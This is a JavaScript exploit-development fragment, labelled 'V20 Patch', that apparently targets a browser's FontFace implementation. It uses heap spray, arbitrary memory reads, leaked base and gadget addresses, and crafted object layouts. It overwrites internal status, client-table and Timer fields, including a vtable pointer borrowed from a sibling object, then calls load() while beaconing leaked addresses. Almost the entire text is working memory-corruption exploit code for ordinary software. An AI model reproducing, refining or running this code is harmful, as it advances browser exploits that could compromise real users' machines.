// V20 Patch: Three-Arm Timer Investigation (Council-Recommended)
// Arm A: Status Oracle | Arm B: Success Control | Arm C: Timer Intervention

/* ==== V20: THREE-ARM TIMER INVESTIGATION ====
 *
 * COUNCIL FINDING: V18C crashes even with all fields crafted.
 * Leading hypothesis: zeroed Timer is not operationally valid for
 * Pending/TimedOut status-transition path (m_timeoutTimer.stop()).
 *
 * V20 tests three arms:
 * A: Status oracle (no load() call, just status read/write)
 * B: Success control (no transition, should be safe)
 * C: Timer intervention (repair Timer from sibling, test Pending path)
 *
 * CRITICAL: Read carrier clobbers Timer at +0x90/+0x94.
 * Must rewrite Timer bytes AFTER last arbitrary read.
 * Status write must be FINAL write before load().
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V20-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* Query param: arm=A|B|C */
      var ARM=(function(){var m=/[?&]arm=([ABC])/.exec(location.search);return m?m[1]:'A';})();
      bs('V20-ARM='+ARM);

      /* Save pre-state for witness */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ==== COMMON INSTRUMENTATION ==== */
      bs('V20-COMMON-START');

      /* Beacon critical addresses */
      bs('V20-SELF='+hex(S));
      bs('V20-L1='+hex(L1));
      bs('V20-L2='+hex(L2));
      bs('V20-FB='+hex(FB));

      /* Dump complete 192-byte backing BEFORE any modifications */
      var backingH=readAt(S,0xC0);
      bs('V20-BACKING-DUMP='+backingH);

      /* Dump wrapper bytes */
      var wrapperH=readAt(FB,0x40);
      bs('V20-WRAPPER-DUMP='+wrapperH);

      /* Craft manifest */
      bs('V20-MANIFEST-arm='+ARM+'-rt=0');

      /* ==== ARM A: ZERO-RISK STATUS ORACLE ==== */
      if(ARM==='A'){
        bs('V20-ARM-A-STATUS-ORACLE');

        /* Test all four status values WITHOUT calling load() */
        var statusTests=[0,1,3,4];
        var statusNames=['unloaded','loading','loaded','error'];
        var allMatch=true;

        for(var sti=0;sti<statusTests.length;sti++){
          var stVal=statusTests[sti];
          var expected=statusNames[sti];

          /* Write status byte */
          hitBuf[0x82]=stVal;
          bs('V20-A-WRITE-status='+stVal);

          /* Read via JS binding */
          try{
            var jsStatus=faces[zi].status;
            bs('V20-A-READ-status='+jsStatus+'-expected='+expected);

            if(jsStatus===expected){
              bs('V20-A-MATCH-'+stVal+'-OK');
            }else{
              bs('V20-A-MISMATCH-'+stVal+'-got='+jsStatus+'-expect='+expected);
              allMatch=false;
            }
          }catch(e){
            bs('V20-A-ERROR-'+stVal+'-'+String(e&&e.message?e.message:'?'));
            allMatch=false;
          }
        }

        if(allMatch){
          bs('V20-A-ALL-MATCH-layout-confirmed');
          verd('ok','V20 Arm A: Status oracle PASS');
        }else{
          bs('V20-A-LAYOUT-FAIL-stop-all-load-experiments');
          verd('err','V20 Arm A: Status oracle FAIL - layout mismatch');
        }

        bs('V20-A-DONE');
      }

      /* ==== ARM B: SUCCESS, NO-TRANSITION CONTROL ==== */
      if(ARM==='B'){
        bs('V20-ARM-B-SUCCESS-CONTROL');

        /* Set status to Success (3) */
        hitBuf[0x82]=3;
        bs('V20-B-STATUS-Success');

        /* Empty sources (verified) */
        for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;
        bs('V20-B-SOURCES-empty');

        /* Preserve original client table */
        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V20-B-CLIENTS-original');

        /* Override = Block */
        hitBuf[0x87]=1;
        for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
        bs('V20-B-OVERRIDE-Block');

        /* Timer zeroed (should not be used in Success path) */
        for(var tz=0x88;tz<=0xBF;tz++)hitBuf[tz]=0;
        bs('V20-B-TIMER-zeroed');

        /* Verify final state BEFORE load */
        bs('V20-B-VERIFY-sources='+hitBuf.slice(0x28,0x38).map(x=>x.toString(16)).join(','));
        bs('V20-B-VERIFY-status='+hitBuf[0x82]);
        bs('V20-B-VERIFY-override='+hitBuf[0x87]);

        /* Call load() - should be no-transition, no client iteration, no Timer */
        bs('V20-B-LOAD-PRE');
        try{
          faces[zi].load();
          bs('V20-B-LOAD-RETURNED');

          /* Check status after */
          var afterStatus=faces[zi].status;
          bs('V20-B-STATUS-AFTER='+afterStatus);

          if(afterStatus==='loaded'){
            bs('V20-B-SUCCESS-no-transition-confirmed');
            verd('ok','V20 Arm B: Success control PASS');
          }else{
            bs('V20-B-UNEXPECTED-status='+afterStatus);
            verd('err','V20 Arm B: Unexpected status');
          }
        }catch(e){
          bs('V20-B-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
          bs('V20-B-CRASH-stop-all-load-variants-need-native-capture');
          verd('err','V20 Arm B: CRASH - need native capture');
        }

        bs('V20-B-DONE');
      }

      /* ==== ARM C: FRESH-SESSION TIMER INTERVENTION ==== */
      if(ARM==='C'){
        bs('V20-ARM-C-TIMER-INTERVENTION');

        /* Find a sibling face with valid Timer */
        bs('V20-C-FIND-SIBLING');
        var sib=0n, sibBk=0n;
        for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
          var q0h=readAt(sa,8);
          if(qAt(q0h,0)===VP){
            var bkH=readAt(sa+0x10n,8);
            var bk=qAt(bkH,0);
            if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk<0x10000000000n){sib=sa;sibBk=bk;}
          }
        }

        if(sibBk===0n){
          bs('V20-C-NO-SIBLING-cannot-proceed');
          verd('err','V20 Arm C: No sibling found');
          throw 'no sibling';
        }

        bs('V20-C-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

        /* Harvest Timer fields from sibling */
        var tVptrH=readAt(sibBk+0x90n,8);
        var tVptr=qAt(tVptrH,0);
        var tThreadH=readAt(sibBk+0xB0n,8);
        var tThread=qAt(tThreadH,0);

        bs('V20-C-HARVEST-tVptr='+hex(tVptr)+'-tThread='+hex(tThread));

        /* Craft face (same as V18C but with Timer repair) */
        bs('V20-C-CRAFT-START');

        /* Empty sources */
        for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;

        /* Null client table */
        for(var i=0;i<8;i++)hitBuf[0x58+i]=0;

        /* Hash table header */
        hitBuf[0x60]=3; hitBuf[0x61]=0; hitBuf[0x62]=0; hitBuf[0x63]=0;
        hitBuf[0x64]=0; hitBuf[0x65]=2; hitBuf[0x66]=0; hitBuf[0x67]=0;

        /* Override = Block */
        hitBuf[0x87]=1;
        for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;

        /* TIMER REPAIR (non-owning diagnostic state) */
        bs('V20-C-TIMER-REPAIR');
        dvSetBig(sv,0x90,tVptr);     /* +0x90 = tVptr (borrowed vptr) */
        dvSetBig(sv,0x98,0n);        /* +0x98 = 0 (fire time) */
        dvSetBig(sv,0xA0,0n);        /* +0xA0 = 0 */
        dvSetBig(sv,0xA8,0n);        /* +0xA8 = 0 (heap item - NOT copied) */
        dvSetBig(sv,0xB0,tThread);   /* +0xB0 = tThread (borrowed thread) */
        dvSetBig(sv,0xB8,0n);        /* +0xB8 = 0 (callback - NOT copied) */

        bs('V20-C-TIMER-INSTALLED-tVptr='+hex(tVptr)+'-tThread='+hex(tThread));

        /* Promise null */
        for(var pb=0;pb<8;pb++)hitBuf[0x18+pb]=0;

        /* sourcesPopulated=1 */
        hitBuf[0x83]=1;

        /* CRITICAL: Status write must be FINAL write before load() */
        bs('V20-C-FINAL-STATUS-WRITE');
        hitBuf[0x82]=0;  /* Pending - LAST WRITE */

        /* Verify final state */
        bs('V20-C-VERIFY-status='+hitBuf[0x82]);
        bs('V20-C-VERIFY-timer90='+hitBuf.slice(0x90,0x98).map(x=>x.toString(16)).join(','));
        bs('V20-C-VERIFY-timerB0='+hitBuf.slice(0xB0,0xB8).map(x=>x.toString(16)).join(','));

        /* Call load() */
        bs('V20-C-LOAD-PRE');
        try{
          faces[zi].load();
          bs('V20-C-LOAD-RETURNED');

          /* Check status after */
          var afterStatus=faces[zi].status;
          bs('V20-C-STATUS-AFTER='+afterStatus);

          if(afterStatus==='error'){
            bs('V20-C-SUCCESS-timer-was-the-cause');
            verd('ok','V20 Arm C: Timer intervention PASS - Timer was the cause!');
          }else{
            bs('V20-C-UNEXPECTED-status='+afterStatus+'-expected=error');
            verd('err','V20 Arm C: Unexpected status (model error)');
          }
        }catch(e){
          bs('V20-C-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
          bs('V20-C-CRASH-timer-repair-insufficient-need-native-capture');
          verd('err','V20 Arm C: CRASH - Timer repair insufficient');
        }

        bs('V20-C-DONE');
      }

      /* Restore original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V20-RESTORED');

    }else bs('V20-SKIP-bad-idx');
  }else bs('V20-SKIP-missing-data');
}catch(e20){bs('V20-ERR-'+String(e20&&e20.message?e20.message:'?'));}
/* ==== V20 END ==== */
